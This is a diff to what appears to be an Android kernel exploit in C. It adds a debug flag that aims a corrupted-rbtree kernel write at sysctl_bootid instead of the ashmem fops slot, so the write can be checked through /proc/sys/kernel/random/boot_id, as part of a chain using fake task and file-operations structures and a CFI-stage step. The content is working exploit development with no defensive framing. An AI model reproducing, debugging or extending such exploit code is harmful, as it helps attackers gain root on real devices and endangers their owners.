@@ -505,9 +505,25 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + fake_task_off;
   fake_fops = payload_base + fake_fops_off;
+  // FOPS_WRITE_PROBE aims the rbtree write at sysctl_bootid instead of the
+  // ashmem fops slot. tegu fails try_cfi_stage() step 4 on every attempt of
+  // every route — 102 in a row on one run — which is systematic, not a lost
+  // reclaim race, and the log cannot say whether the write is landing in the
+  // wrong place or not happening at all. sysctl_bootid answers that, because
+  // unlike the fops slot it is readable from userspace through
+  // /proc/sys/kernel/random/boot_id. If boot_id changes, the chain walk did
+  // perform the write and the fops target is what is wrong; if it does not,
+  // the write never fired and the page or the chain is.
+  //
+  // Safe to aim there: the slide route has already overwritten sysctl_bootid
+  // by this point, restore_slide_boot_id() only runs later in try_cfi_stage(),
+  // and the ashmem path was cached from the real boot_id before any of it.
+  uintptr_t fops_write_target = env_flag("FOPS_WRITE_PROBE", 0)
+      ? (uintptr_t)SLIDE_RANDOM_BOOT_ID_DATA
+      : data_addr(ASHMEM_MISC_FOPS);
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = fops_write_target;
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
@@ -519,7 +535,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
   uintptr_t write_pc = fake_fops;
   uintptr_t write_right = 0;
-  uintptr_t write_left = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_left = fops_write_target;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
